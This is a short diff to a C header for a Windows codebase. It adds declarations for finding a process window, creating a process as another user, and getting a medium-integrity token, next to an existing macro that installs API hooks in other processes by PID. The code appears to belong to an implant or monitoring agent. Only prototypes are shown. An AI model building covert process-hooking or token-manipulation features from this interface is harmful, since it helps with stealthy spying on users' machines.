@@ -34,6 +34,7 @@ extern char *HM_memstr(char *, char *);
 extern char *HM_FindProc(DWORD);
 extern WCHAR *HM_FindProcW(DWORD);
 extern DWORD HM_FindPid(char *, BOOL);
+extern HWND HM_GetProcessWindow(char *procname);
 extern BOOL HM_CheckNewConf(void);
 extern BOOL HM_GetDate(nanosec_time *);
 extern BYTE *HM_ReadClearConf(char *);
@@ -105,6 +106,7 @@ typedef struct {
 typedef struct {COMMONDATA;} HMCommonDataStruct;
 
 void __stdcall HM_CreateProcess(char *, DWORD, STARTUPINFO *, PROCESS_INFORMATION *, DWORD);
+void __stdcall HM_CreateProcessAsUser(char *, DWORD, STARTUPINFO *, PROCESS_INFORMATION *, DWORD, HANDLE);
 
 ////////////////////////////////////////////////////////////////////////////////////////
 ////////////////////////////////////////////////////////////////////////////////////////
@@ -176,3 +178,4 @@ typedef DWORD (__stdcall *HM_CreateService_t)(DWORD, HMServiceStruct *);
 																				HM_sCreateHookA(DWPID, APINAME, DLLNAME, (BYTE *)HOOKADD, HOOKDATA.dwHookLen, (BYTE *)&HOOKDATA, sizeof(HOOKDATA))); 
 																		
 																		
+HANDLE GetMediumLevelToken();
